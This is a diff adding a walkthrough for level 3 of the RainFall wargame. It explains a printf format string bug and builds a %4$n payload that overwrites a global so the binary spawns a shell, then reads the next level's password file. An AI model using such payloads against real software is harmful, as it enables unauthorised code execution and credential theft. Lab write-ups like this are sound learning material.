@@ -1,0 +1,65 @@
+# RainFall - Level 3: Format String Exploit
+
+## Overview
+Level 3 contains a **format string vulnerability** in function `v`. The program reads user input and passes it directly to `printf()`, which means our input is treated as a format string instead of plain text.
+
+This gives us control over `printf()` and lets us read or write memory.
+
+## Why This Works
+The program also checks a global variable at `0x0804988c`.
+If that variable becomes `0x40`, the program follows the success path and calls `system()`.
+
+So the goal is simple:
+- find the right stack offset
+- use `%n` to write `64` to `0x0804988c`
+
+## Finding the Offset
+A common test is:
+
+```bash
+python -c 'print "AAAA." + ".%p" * 10'
+```
+
+If `AAAA` appears as `0x41414141` in the output, you know where your input starts on the stack.
+For this challenge, the useful offset is `4`.
+
+## Building the Payload
+The payload has three parts:
+
+1. **Target address**: `0x0804988c`
+2. **Padding**: `60` bytes, so the printed length becomes `64`
+3. **Write command**: `%4$n`
+
+The final layout is:
+
+```text
+[address][padding][%4$n]
+```
+
+Little-endian address:
+
+```bash
+\x8c\x98\x04\x08
+```
+
+## Exploit Command
+
+```bash
+(python -c 'print "\x8c\x98\x04\x08" + "Q" * 60 + "%4$n"'; cat) | ./level3
+```
+
+The `cat` keeps the shell open after the exploit runs.
+
+## After Exploitation
+If the exploit works, you should get a shell as the next level user.
+
+```bash
+whoami
+cat /home/user/level4/.pass
+```
+
+## Summary
+- Vulnerability: format string
+- Goal: overwrite global value at `0x0804988c`
+- Required value: `0x40`
+- Main trick: use `%4$n` with the correct stack offset
